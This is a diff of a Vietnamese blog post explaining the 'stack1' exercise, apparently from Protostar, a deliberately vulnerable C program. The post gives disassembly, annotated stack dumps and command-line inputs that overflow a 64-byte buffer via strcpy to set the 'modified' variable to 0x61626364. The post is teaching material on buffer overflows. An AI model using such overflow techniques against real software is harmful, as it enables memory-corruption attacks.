@@ -2,6 +2,8 @@
 layout: post
 title: stack1
 ---
+Trong bài trước, chúng ta đã tìm hiểu về cách 1 biến tạm được lưu trên stack và lỗ hổng cho phép giá của nó có thể thay đổi gián tiếp qua hàm `gets`. Ngoài hàm `gets`, trong bài này, ta sẽ xem xét một hàm khác là `strcpy`, cũng có khả năng gây ra lỗ hổng tương tự.
+Sau đây là source code của chương trình stack1:
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -28,6 +30,7 @@ int main(int argc, char **argv)
 }
 ```
 
+Khi disassemble hàm `main`, ta được đoạn chương trình sau:
 ```asm
 0x08048464 <main+0>:    push   ebp
 0x08048465 <main+1>:    mov    ebp,esp
@@ -61,31 +64,58 @@ int main(int argc, char **argv)
 0x080484d6 <main+114>:  ret
 ```
 
+Cũng giống như bài trước, ta rút ra được những lưu ý sau:
+1. Biến `modified` sẽ được lưu trên stack với địa chỉ `esp + 0x5c`. Biến này có 4 byte.
+2. Biến `buffer` cũng được lưu trên stack từ địa chỉ `esp + 0x1c` cho đến `esp + 0x5b`. Biến này có 64 byte.
+
+2 biến `buffer` và `modified` nằm kề nhau và chiếm bộ nhớ từ `esp + 0x1c` cho đến hết `esp + 0x5f`.
+Ở đây, giá trị của `buffer` sẽ được quyết định bởi tham số đầu tiên `argv[1]` khi chương trình được chạy.
+Chỉ cần tham số này vượt quá 64 byte, giá trị của `modified` cũng sẽ bị thay đổi.
+
+Để dễ tưởng tượng, sau đây là 96 byte bộ nhớ bắt đầu từ địa chỉ `esp`, trước khi người dùng nhập giá trị cho `buffer`.
+Phân biệt theo màu: <span style="color:aqua">buffer</span> và <span style="color:orangered">modified</span>.
 <pre>
 0xbffff6f0:     0xbffff70c      0xbffff93e      0xb7fff8f8      0xb7f0186e
-0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0xb7eada75
-0xbffff710:     0xb7fd7ff4      0x080496fc      0xbffff728      0x08048334
-0xbffff720:     0xb7ff1040      0x080496fc      0xbffff758      0x08048509
-0xbffff730:     0xb7fd8304      0xb7fd7ff4      0x080484f0      0xbffff758
-0xbffff740:     0xb7ec6365      0xb7ff1040      0x080484fb      0x00000000
+0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0xb7eada75</span>
+0xbffff710:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080496fc</span>      <span style="color:aqua">0xbffff728</span>      <span style="color:aqua">0x08048334</span>
+0xbffff720:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080496fc</span>      <span style="color:aqua">0xbffff758</span>      <span style="color:aqua">0x08048509</span>
+0xbffff730:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080484f0</span>      <span style="color:aqua">0xbffff758</span>
+0xbffff740:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080484fb</span>      <span style="color:orangered">0x00000000</span>
 </pre>
+
+Nếu sử dụng input như bài trước, ta sẽ sửa được giá trị của `modified` thành `0x00000078`.
+Sau đây là bộ nhớ sau `strcpy`.
+
+```bash
+stack1 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888x"
+```
 
 <pre>
 0xbffff6f0:     0xbffff70c      0xbffff941      0xb7fff8f8      0xb7f0186e
-0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
-0xbffff710:     0x42424242      0x43434343      0x44444444      0x45454545
-0xbffff720:     0x46464646      0x47474747      0x48484848      0x31313131
-0xbffff730:     0x32323232      0x33333333      0x34343434      0x35353535
-0xbffff740:     0x36363636      0x37373737      0x38383838      0x00000078
+0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0x41414141</span>
+0xbffff710:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
+0xbffff720:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
+0xbffff730:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
+0xbffff740:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x00000078</span>
 </pre>
+
+Tuy nhiên để đạt được đúng mục tiêu exploit chương trình stack1, chúng ta sẽ cần gán giá trị cho `modified` là `0x61626364`.
+4 byte giá trị này tương đương với `"dcba"` (chuỗi ngược do kiến trúc CPU dùng Little Endian).
+Sau đây là lệnh và tham số để chạy stack1 cho ra đúng kết quả mong muốn.
+
+```bash
+stack1 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888dcba"
+```
+
+Đi kèm với đó là bộ nhớ sau `strcpy` để bạn dễ tưởng tượng.
 
 <pre>
 0xbffff6f0:     0xbffff70c      0xbffff93e      0xb7fff8f8      0xb7f0186e
-0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
-0xbffff710:     0x42424242      0x43434343      0x44444444      0x45454545
-0xbffff720:     0x46464646      0x47474747      0x48484848      0x31313131
-0xbffff730:     0x32323232      0x33333333      0x34343434      0x35353535
-0xbffff740:     0x36363636      0x37373737      0x38383838      0x61626364
+0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0x41414141</span>
+0xbffff710:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
+0xbffff720:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
+0xbffff730:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
+0xbffff740:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x61626364</span>
 </pre>
 
 ## Ref
